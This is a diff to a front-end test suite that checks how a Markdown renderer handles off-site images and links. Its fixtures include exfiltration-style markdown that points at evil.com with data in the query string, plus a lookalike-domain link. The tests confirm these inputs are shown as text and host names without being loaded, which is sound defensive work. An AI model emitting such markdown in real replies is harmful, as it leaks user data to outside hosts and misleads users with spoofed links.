@@ -76,14 +76,24 @@ describe("MarkdownText off-site content", () => {
     expect(img?.getAttribute("referrerpolicy")).toBe("no-referrer");
   });
 
-  it("shows an off-site image as a link naming its host, without loading it", () => {
+  it("shows an off-site image as its alt text and host, without loading it", () => {
     const { container } = render(
       <MarkdownText>{"![secret](https://evil.com/p.png?d=abc)"}</MarkdownText>,
     );
     expect(container.querySelector("img")).toBeNull();
-    const link = screen.getByRole("link", { name: "secret" });
-    expect(link.getAttribute("href")).toBe("https://evil.com/p.png?d=abc");
-    expect(container.textContent).toContain("(evil.com)");
+    expect(container.querySelector("a")).toBeNull();
+    expect(container.textContent).toBe("secret (image from evil.com)");
+  });
+
+  it("doesn't nest a link inside a linked off-site image", () => {
+    const { container } = render(
+      <MarkdownText>
+        {"[![logo](https://evil.com/i.png)](https://evil.com/p)"}
+      </MarkdownText>,
+    );
+    expect(container.querySelectorAll("a")).toHaveLength(1);
+    expect(container.querySelector("a a")).toBeNull();
+    expect(container.querySelector("img")).toBeNull();
   });
 
   it("shows only the alt text of a data image", () => {
@@ -117,6 +127,40 @@ describe("MarkdownText off-site content", () => {
       </MarkdownText>,
     );
     expect(container.textContent).toBe("ACCESS (evil.com)");
+  });
+
+  it("names the host when the link text only contains it", () => {
+    const { container } = render(
+      <MarkdownText>{"[access-ci.org](https://ss-ci.org/x?d=1)"}</MarkdownText>,
+    );
+    expect(container.textContent).toBe("access-ci.org (ss-ci.org)");
+  });
+
+  it("names the host when the link text mentions it elsewhere", () => {
+    const { container } = render(
+      <MarkdownText>
+        {"[support.access-ci.org, not evil.com](https://evil.com)"}
+      </MarkdownText>,
+    );
+    expect(container.textContent).toContain("(evil.com)");
+  });
+
+  it("names the host of a protocol-relative link and opens it in a new tab", () => {
+    const { container } = render(
+      <MarkdownText>{"[ACCESS docs](//evil.com/x?d=1)"}</MarkdownText>,
+    );
+    expect(container.textContent).toBe("ACCESS docs (evil.com)");
+    const link = screen.getByRole("link", { name: "ACCESS docs" });
+    expect(link.getAttribute("target")).toBe("_blank");
+  });
+
+  it("describes an off-site link by its host for screen readers", () => {
+    render(<MarkdownText>{"[Fix it](https://evil.com/?d=1)"}</MarkdownText>);
+    const link = screen.getByRole("link", { name: "Fix it" });
+    const label = document.getElementById(
+      link.getAttribute("aria-describedby") ?? "",
+    );
+    expect(label?.textContent).toContain("evil.com");
   });
 
   it("doesn't repeat a host the link text already shows", () => {
